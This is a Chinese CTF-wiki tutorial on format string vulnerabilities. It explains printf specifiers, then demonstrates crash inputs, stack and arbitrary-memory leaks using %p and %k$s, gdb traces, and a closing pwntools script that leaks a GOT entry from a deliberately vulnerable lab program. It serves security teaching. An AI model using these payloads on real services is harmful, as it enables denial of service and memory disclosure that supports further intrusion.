> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [wiki.xazlsec.com](https://wiki.xazlsec.com/project-15/doc-249/)

> 首先，对格式化字符串漏洞的原理进行简单介绍。 ## 格式化字符串函数介绍 格式化字符串函数可以接受可变数量的参数，并将 ** 第一个参数作为格式化字符串，根据其来解析之后的参数 **。通俗来说，格式化字

首先，对格式化字符串漏洞的原理进行简单介绍。

格式化字符串函数介绍
----------

格式化字符串函数可以接受可变数量的参数，并将**第一个参数作为格式化字符串，根据其来解析之后的参数**。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来**输出信息，调试程序，或者处理字符串**。一般来说，格式化字符串在利用的时候主要分为三个部分

*   格式化字符串函数
*   格式化字符串
*   后续参数，**可选**

这里我们给出一个简单的例子，其实相信大多数人都接触过 printf 函数之类的。之后我们再一个一个进行介绍。

![][img-0]

### 格式化字符串函数

常见的有格式化字符串函数有

*   输入
    *   scanf
*   输出

<table><thead><tr><th>函数</th><th>基本介绍</th></tr></thead><tbody><tr><td>printf</td><td>输出到 stdout</td></tr><tr><td>fprintf</td><td>输出到指定 FILE 流</td></tr><tr><td>vprintf</td><td>根据参数列表格式化输出到 stdout</td></tr><tr><td>vfprintf</td><td>根据参数列表格式化输出到指定 FILE 流</td></tr><tr><td>sprintf</td><td>输出到字符串</td></tr><tr><td>snprintf</td><td>输出指定字节数到字符串</td></tr><tr><td>vsprintf</td><td>根据参数列表格式化输出到字符串</td></tr><tr><td>vsnprintf</td><td>根据参数列表格式化输出指定字节到字符串</td></tr><tr><td>setproctitle</td><td>设置 argv</td></tr><tr><td>syslog</td><td>输出日志</td></tr><tr><td>err, verr, warn, vwarn 等</td><td>。。。</td></tr></tbody></table>

### 格式化字符串

这里我们了解一下格式化字符串的格式，其基本格式如下

```
%[parameter][flags][field width][.precision][length]type
```

每一种 pattern 的含义请具体参考维基百科的[格式化字符串](https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2) 。以下几个 pattern 中的对应选择需要重点关注

*   parameter
    *   n$，获取格式化字符串中的指定参数
*   flag
*   field width
    *   输出的最小宽度
*   precision
    *   输出的最大长度
*   length，输出的长度
    *   hh，输出一个字节
    *   h，输出一个双字节
*   type
    *   d/i，有符号整数
    *   u，无符号整数
    *   x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。
    *   o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。
    *   s，如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。
    *   c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。
    *   p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &a) 打印变量 a 所在的地址。
    *   n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。
    *   %， ‘`%`‘字面值，不接受任何 flags, width。

### 参数

就是相应的要输出的变量。

格式化字符串漏洞原理
----------

在一开始，我们就给出格式化字符串的基本介绍，这里再说一些比较细致的内容。我们上面说，格式化字符串函数是根据格式化字符串函数来进行解析的。**那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制**。比如说’%s’表明我们会输出一个字符串参数。

我们再继续以上面的为例子进行介绍

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==)

对于这样的例子，在进入 printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下

```
some value
3.14
123456
addr of "red"
addr of format string: Color %s...

```

**注：这里我们假设 3.14 上面的值为某个未知的值。**

在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况

*   当前字符不是 %，直接输出到相应标准输出。
*   当前字符是 %， 继续读取下一个字符
    *   如果没有字符，报错
    *   如果下一个字符是 %, 输出 %
    *   否则根据相应的字符，获取相应的参数，对其进行解析并输出

那么假设，此时我们在编写程序时候，写成了下面的样子

```
printf("Color %s, Number %d, Float %4.2f");
```

此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为

1.  解析其地址对应的字符串
2.  解析其内容对应的整形值
3.  解析其内容对应的浮点值

对于 2，3 来说倒还无妨，但是对于对于 1 来说，如果提供了一个不可访问地址，比如 0，那么程序就会因此而崩溃。

这基本就是格式化字符串漏洞的基本原理了。

参考阅读
----

*   [https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2](https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2)

其实，在上一部分，我们展示了格式化字符串漏洞的两个利用手段

*   使程序崩溃，因为 %s 对应的参数地址不合法的概率比较大。
*   查看进程内容，根据 %d，%f 输出了栈上的内容。

下面我们会对于每一方面进行更加详细的解释。

程序崩溃
----

通常来说，利用格式化字符串漏洞使得程序崩溃是最为简单的利用方式，因为我们只需要输入若干个 %s 即可

```
%s%s%s%s%s%s%s%s%s%s%s%s%s%s
```

这是因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。这一利用，虽然攻击者本身似乎并不能控制程序，但是这样却可以造成程序不可用。比如说，如果远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。

泄露内存
----

利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作

*   泄露栈内存
    *   获取某个变量的值
    *   获取某个变量对应地址的内存
*   泄露任意地址内存
    *   利用 GOT 表得到 libc 函数地址，进而获取 libc，进而获取其它 libc 函数地址
    *   盲打，dump 整个程序，获取有用信息。

### 泄露栈内存

例如，给定如下程序

```
#include <stdio.h>
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);
  return 0;
}

```

然后，我们简单编译一下

```
➜  leakmemory git:(master) ✗ gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c
leakmemory.c: In function ‘main’:
leakmemory.c:7:10: warning: format not a string literal and no format arguments [-Wformat-security]
   printf(s);
          ^

```

可以看出，编译器指出了我们的程序中没有给出格式化字符串的参数的问题。下面，我们来看一下，如何获取对应的栈内存。

根据 C 语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数 (64 位会根据其传参的规则进行获取)。这里我们主要介绍 32 位。

#### 获取栈变量数值

首先，我们可以利用格式化字符串来获取栈上变量的数值。我们可以试一下，运行结果如下

```
➜  leakmemory git:(master) ✗ ./leakmemory
%08x.%08x.%08x
00000001.22222222.ffffffff.%08x.%08x.%08x
ffcfc400.000000c2.f765a6bb

```

可以看到，我们确实得到了一些内容。为了更加细致的观察，我们利用 GDB 来调试一下，以便于验证我们的想法，这里删除了一些不必要的信息，我们只关注代码段以及栈。

首先，启动程序，将断点下在 printf 函数处

```
➜  leakmemory git:(master) ✗ gdb leakmemory
gef➤  b printf
Breakpoint 1 at 0x8048330

```

之后，运行程序

```
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory
%08x.%08x.%08x

```

此时，程序等待我们的输入，这时我们输入 %08x.%08x.%08x，然后敲击回车，是程序继续运行，可以看出程序首先断在了第一次调用 printf 函数的位置

```
Breakpoint 1, __printf (format=0x8048563 "%08x.%08x.%08x.%s\n") at printf.c:28
28    printf.c: 没有那个文件或目录.
────────────────────────────────────────────────[ code:i386 ]────
   0xf7e44667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
   0xf7e4466d                  nop
   0xf7e4466e                  xchg   ax, ax
 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret
      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret
──────────────────────────────────────────────[ stack ]────
['0xffffccec', 'l8']
8
0xffffccec│+0x00: 0x080484bf  →  <main+84> add esp, 0x20     ← $esp
0xffffccf0│+0x04: 0x08048563  →  "%08x.%08x.%08x.%s"
0xffffccf4│+0x08: 0x00000001
0xffffccf8│+0x0c: 0x22222222
0xffffccfc│+0x10: 0xffffffff
0xffffcd00│+0x14: 0xffffcd10  →  "%08x.%08x.%08x"
0xffffcd04│+0x18: 0xffffcd10  →  "%08x.%08x.%08x"
0xffffcd08│+0x1c: 0x000000c2

```

可以看出，此时此时已经进入了 printf 函数中，栈中第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为 a 的值，第四个变量为 b 的值，第五个变量为 c 的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序

```
gef➤  c
Continuing.
00000001.22222222.ffffffff.%08x.%08x.%08x

```

可以看出，程序确实输出了每一个变量对应的数值，并且断在了下一个 printf 处

```
Breakpoint 1, __printf (format=0xffffcd10 "%08x.%08x.%08x") at printf.c:28
28    in printf.c
───────────────────────────────────────────────────────────────[ code:i386 ]────
   0xf7e44667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
   0xf7e4466d                  nop
   0xf7e4466e                  xchg   ax, ax
 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret
      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret
────────────────────────────────────────────────────────[ stack ]────
['0xffffccfc', 'l8']
8
0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
0xffffcd00│+0x04: 0xffffcd10  →  "%08x.%08x.%08x"
0xffffcd04│+0x08: 0xffffcd10  →  "%08x.%08x.%08x"
0xffffcd08│+0x0c: 0x000000c2
0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10
0xffffcd10│+0x14: "%08x.%08x.%08x"     ← $eax
0xffffcd14│+0x18: ".%08x.%08x"
0xffffcd18│+0x1c: "x.%08x"

```

此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出。继续运行，我们可以得到如下结果去，确实和想象中的一样。

```
gef➤  c
Continuing.
ffffcd10.000000c2.f7e8b6bb[Inferior 1 (process 57077) exited normally]

```

当然，我们也可以使用 %p 来获取数据，如下

```
%p.%p.%p
00000001.22222222.ffffffff.%p.%p.%p
0xfff328c0.0xc2.0xf75c46bb

```

这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。

**需要注意的是，我们上面给出的方法，都是依次获得栈中的每个参数，我们有没有办法直接获取栈中被视为第 n+1 个参数的值呢**？肯定是可以的啦。方法如下

```
%n$x
```

利用如下的字符串，我们就可以获取到对应的第 n+1 个参数的数值。为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了。

这里我们再次以 gdb 调试一下。

```
➜  leakmemory git:(master) ✗ gdb leakmemory
gef➤  b printf
Breakpoint 1 at 0x8048330
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory
%3$x
Breakpoint 1, __printf (format=0x8048563 "%08x.%08x.%08x.%s\n") at printf.c:28
28    printf.c: 没有那个文件或目录.
─────────────────────────────────────────────────[ code:i386 ]────
   0xf7e44667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
   0xf7e4466d                  nop
   0xf7e4466e                  xchg   ax, ax
 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret
      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret
─────────────────────────────────────────────────────[ stack ]────
['0xffffccec', 'l8']
8
0xffffccec│+0x00: 0x080484bf  →  <main+84> add esp, 0x20     ← $esp
0xffffccf0│+0x04: 0x08048563  →  "%08x.%08x.%08x.%s"
0xffffccf4│+0x08: 0x00000001
0xffffccf8│+0x0c: 0x22222222
0xffffccfc│+0x10: 0xffffffff
0xffffcd00│+0x14: 0xffffcd10  →  "%3$x"
0xffffcd04│+0x18: 0xffffcd10  →  "%3$x"
0xffffcd08│+0x1c: 0x000000c2
gef➤  c
Continuing.
00000001.22222222.ffffffff.%3$x
Breakpoint 1, __printf (format=0xffffcd10 "%3$x") at printf.c:28
28    in printf.c
─────────────────────────────────────────────────────[ code:i386 ]────
   0xf7e44667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
   0xf7e4466d                  nop
   0xf7e4466e                  xchg   ax, ax
 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret
      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret
─────────────────────────────────────────────────────[ stack ]────
['0xffffccfc', 'l8']
8
0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
0xffffcd00│+0x04: 0xffffcd10  →  "%3$x"
0xffffcd04│+0x08: 0xffffcd10  →  "%3$x"
0xffffcd08│+0x0c: 0x000000c2
0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10
0xffffcd10│+0x14: "%3$x"     ← $eax
0xffffcd14│+0x18: 0xffffce00  →  0x00000001
0xffffcd18│+0x1c: 0x000000e0
gef➤  c
Continuing.
f7e8b6bb[Inferior 1 (process 57442) exited normally]

```

可以看出，我们确实获得了 printf 的第 4 个参数所对应的值 f7e8b6bb。

#### 获取栈变量对应字符串

此外，我们还可以获得栈变量对应的字符串，这其实就是需要用到 %s 了。这里还是使用上面的程序，进行 gdb 调试，如下

```
➜  leakmemory git:(master) ✗ gdb leakmemory
gef➤  b printf
Breakpoint 1 at 0x8048330
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory
%s
Breakpoint 1, __printf (format=0x8048563 "%08x.%08x.%08x.%s\n") at printf.c:28
28    printf.c: 没有那个文件或目录.
────────────────────────────────────────────────────────────────[ code:i386 ]────
   0xf7e44667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
   0xf7e4466d                  nop
   0xf7e4466e                  xchg   ax, ax
 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret
      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret
────────────────────────────────────────────────────────[ stack ]────
['0xffffccec', 'l8']
8
0xffffccec│+0x00: 0x080484bf  →  <main+84> add esp, 0x20     ← $esp
0xffffccf0│+0x04: 0x08048563  →  "%08x.%08x.%08x.%s"
0xffffccf4│+0x08: 0x00000001
0xffffccf8│+0x0c: 0x22222222
0xffffccfc│+0x10: 0xffffffff
0xffffcd00│+0x14: 0xffffcd10  →  0xff007325 ("%s"?)
0xffffcd04│+0x18: 0xffffcd10  →  0xff007325 ("%s"?)
0xffffcd08│+0x1c: 0x000000c2
gef➤  c
Continuing.
00000001.22222222.ffffffff.%s
Breakpoint 1, __printf (format=0xffffcd10 "%s") at printf.c:28
28    in printf.c
──────────────────────────────────────────────────────────[ code:i386 ]────
   0xf7e44667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
   0xf7e4466d                  nop
   0xf7e4466e                  xchg   ax, ax
 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret
      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret
──────────────────────────────────────────────────────────────[ stack ]────
['0xffffccfc', 'l8']
8
0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 ("%s"?)
0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 ("%s"?)
0xffffcd08│+0x0c: 0x000000c2
0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10
0xffffcd10│+0x14: 0xff007325 ("%s"?)     ← $eax
0xffffcd14│+0x18: 0xffffce3c  →  0xffffd074  →  "XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]"
0xffffcd18│+0x1c: 0x000000e0
gef➤  c
Continuing.
%s[Inferior 1 (process 57488) exited normally]

```

可以看出，在第二次执行 printf 函数的时候，确实是将 0xffffcd04 处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。

**当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。**

此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定第 printf 的第 3 个参数，如下，此时程序就不能够解析，就崩溃了。

```
➜  leakmemory git:(master) ✗ ./leakmemory
%2$s
00000001.22222222.ffffffff.%2$s
[1]    57534 segmentation fault (core dumped)  ./leakmemory

```

**小技巧总结**

> 1.  利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。
> 2.  利用 %s 来获取变量所对应地址的内容，只不过有零截断。
> 3.  利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。

### 泄露任意地址内存

可以看出，在上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，我们都没能完全控制我们所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。那么我们究竟能不能这样做呢？自然也是可以的啦。

我们再仔细回想一下，一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中 s 是 main 函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。我们选择上面的某个函数调用为例

```
Breakpoint 1, __printf (format=0xffffcd10 "%s") at printf.c:28
28    in printf.c
──────────────────────────────────────────────────────────[ code:i386 ]────
   0xf7e44667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
   0xf7e4466d                  nop
   0xf7e4466e                  xchg   ax, ax
 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret
      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret
──────────────────────────────────────────────────────────────[ stack ]────
['0xffffccfc', 'l8']
8
0xffffccfc│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
0xffffcd00│+0x04: 0xffffcd10  →  0xff007325 ("%s"?)
0xffffcd04│+0x08: 0xffffcd10  →  0xff007325 ("%s"?)
0xffffcd08│+0x0c: 0x000000c2
0xffffcd0c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10
0xffffcd10│+0x14: 0xff007325 ("%s"?)     ← $eax
0xffffcd14│+0x18: 0xffffce3c  →  0xffffd074  →  "XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]"
0xffffcd18│+0x1c: 0x000000e0

```

可以看出在栈上的第二个变量就是我们的格式化字符串地址 0xffffcd10，同时该地址存储的也确实是”%s” 格式化字符串内容。

那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容。

```
addr%k$s
```

> 注： 在这里，如果格式化字符串在栈上，那么我们就一定确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址 8 字节或者 16 字节。

下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定

```
[tag]%p%p%p%p%p%p...
```

一般来说，我们会重复某个字符的机器字长来作为 tag，而后面会跟上若干个 %p 来输出栈上的内容，如果内容与我们前面的 tag 重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其他字符进行尝试，进行再次确认。这里我们利用字符’A’作为特定字符，同时还是利用之前编译好的程序，如下

```
➜  leakmemory git:(master) ✗ ./leakmemory
AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
AAAA0xffaab1600xc20xf76146bb0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xffaab2240xf77360000xaec7%

```

由 0x41414141 处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第 5 个参数，但是是格式化字符串的第 4 个参数。我们可以来测试一下

```
➜  leakmemory git:(master) ✗ ./leakmemory
%4$s
00000001.22222222.ffffffff.%4$s
[1]    61439 segmentation fault (core dumped)  ./leakmemory

```

可以看出，我们的程序崩溃了，为什么呢？这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，，所以程序就崩溃了。具体的可以参考下面的调试。

```
 → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret
      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret
───────────────────────────────────────────────────────────────────[ stack ]────
['0xffffcd0c', 'l8']
8
0xffffcd0c│+0x00: 0x080484ce  →  <main+99> add esp, 0x10     ← $esp
0xffffcd10│+0x04: 0xffffcd20  →  "%4$s"
0xffffcd14│+0x08: 0xffffcd20  →  "%4$s"
0xffffcd18│+0x0c: 0x000000c2
0xffffcd1c│+0x10: 0xf7e8b6bb  →  <handle_intel+107> add esp, 0x10
0xffffcd20│+0x14: "%4$s"     ← $eax
0xffffcd24│+0x18: 0xffffce00  →  0x00000000
0xffffcd28│+0x1c: 0x000000e0
───────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0xf7e44670 → Name: __printf(format=0xffffcd20 "%4$s")
[#1] 0x80484ce → Name: main()
────────────────────────────────────────────────────────────────────────────────
gef➤  help x/
Examine memory: x/FMT ADDRESS.
ADDRESS is an expression for the memory address to examine.
FMT is a repeat count followed by a format letter and a size letter.
Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),
  t(binary), f(float), a(address), i(instruction), c(char), s(string)
  and z(hex, zero padded on the left).
Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).
The specified number of objects of the specified size are printed
according to the format.
Defaults for format and size letters are those previously used.
Default count is 1.  Default address is following last thing printed
with this command or "print".
gef➤  x/x 0xffffcd20
0xffffcd20:    0x73243425
gef➤  vmmap
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory
0x08049000 0x0804a000 0x00000000 r-- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory
0x0804a000 0x0804b000 0x00001000 rw- /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory
0x0804b000 0x0806c000 0x00000000 rw- [heap]
0xf7dfb000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fab000 0xf7fad000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so
0xf7fad000 0xf7fae000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so
0xf7fae000 0xf7fb1000 0x00000000 rw-
0xf7fd3000 0xf7fd5000 0x00000000 rw-
0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]
0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffb000 0xf7ffc000 0x00000000 rw-
0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so
0xffedd000 0xffffe000 0x00000000 rw- [stack]
gef➤  x/x 0x73243425
0x73243425:    Cannot access memory at address 0x73243425

```

显然 0xffffcd20 处所对应的格式化字符串所对应的变量值 0x73243425 并不能够被改程序访问，所以程序就自然崩溃了。

那么如果我们设置一个可访问的地址呢？比如说 scanf@got，结果会怎么样呢？应该自然是输出 scanf 对应的地址了。我们不妨来试一下。

首先，获取 scanf@got 的地址，如下

> 这里之所以没有使用 printf 函数，是因为 scanf 函数会对 0a，0b，0c，00 等字符有一些奇怪的处理，，导致无法正常读入，，感兴趣的可以试试。。。。

```
gef➤  got
/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory：     文件格式 elf32-i386
DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ffc R_386_GLOB_DAT    __gmon_start__
0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7

```

下面我们利用 pwntools 构造 payload 如下

```
from pwn import *
sh = process('./leakmemory')
leakmemory = ELF('./leakmemory')
__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']
print hex(__isoc99_scanf_got)
payload = p32(__isoc99_scanf_got) + '%4$s'
print payload
gdb.attach(sh)
sh.sendline(payload)
sh.recvuntil('%4$s\n')
print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@got
sh.interactive()

```

